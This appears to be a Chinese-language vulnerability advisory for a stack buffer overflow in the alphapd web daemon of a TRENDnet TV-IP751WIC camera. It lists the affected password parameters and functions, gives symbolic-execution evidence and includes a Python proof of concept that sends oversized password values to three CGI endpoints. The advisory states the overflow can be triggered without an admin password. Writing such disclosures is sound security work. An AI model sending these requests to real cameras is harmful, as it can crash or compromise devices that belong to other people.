# CVE-XXXX-XXXX11: TV-IP751WIC alphapd Multi-Password Stack Overflow

| 厂商 TRENDnet | 产品 TV-IP751WIC v1.1.03.03 | CWE-121 | CVSS **9.8 Critical** |

## 1. 漏洞概述

alphapd 在处理摄像头所有密码类配置时，通过 `websGetVar()`/`nvram_bufget()` 读取密码参数后无界复制到栈缓冲区。受影响的密码涵盖管理员、PPPoE、DDNS、Email、FTP 等**全部凭据类型**。

## 2. FirmRec 符号执行证据

```
Simexp验证: 80+ 条日志全部命中 0x41414141
关联CVE: CVE-2019-1663, CVE-2020-10214, CVE-2020-25506
```

### 受影响函数和密码

| 函数 | 参数 | 命中 | 触发场景 |
|------|------|------|---------|
| SystemNetworkChanged 0x41F4E8 | **PPPoEPassword** | 17次 | 宽带拨号密码 |
| SystemDDNSChanged 0x41FA38 | **DDNSPassword** | 14次 | DDNS密码 |
| SystemEmailChanged 0x421B14 | **EmailPassword** | 17次 | 邮件告警密码 |
| SystemFTPChanged 0x422728 | **FTPPassword** | 16次 | FTP密码 |
| websCheckRealm 0x4122BC | **AdminPassword** | 19次 | 管理员密码 |
| FUN_00432574 | **UserPassword** | 5次 | 普通用户密码 |
| FUN_0043372C | **AdminPassword** | 10次 | 管理员验证 |

## 3. PoC

```python
import requests

# 1. 管理员密码溢出
requests.get("http://CAMERA_IP/cgi-bin/admin/set_users.cgi", params={
    "AdminPassword": "A" * 100 + "\x41\x41\x41\x41",
    "UserPassword": "test",
})

# 2. PPPoE 溢出
requests.post("http://CAMERA_IP/cgi-bin/admin/network.cgi", data={
    "IPAddressMode": "PPPoE",
    "PPPoEPassword": "A" * 80 + "\x41\x41\x41\x41",
    "PPPoEUserName": "test@isp.com",
})

# 3. Email 告警溢出  
requests.post("http://CAMERA_IP/cgi-bin/admin/email.cgi", data={
    "EmailPassword": "A" * 80 + "\x41\x41\x41\x41",
    "EmailSMTPServerAddress": "smtp.example.com",
})
```

## 4. 影响

所有密码配置接口均存在栈溢出。攻击者可在**无管理员密码**情况下通过设置向导触发——摄像头初始状态下未强制要求密码认证。

---

*证据: evidence/ 137条日志 | Simexp: 全部 0x41414141*
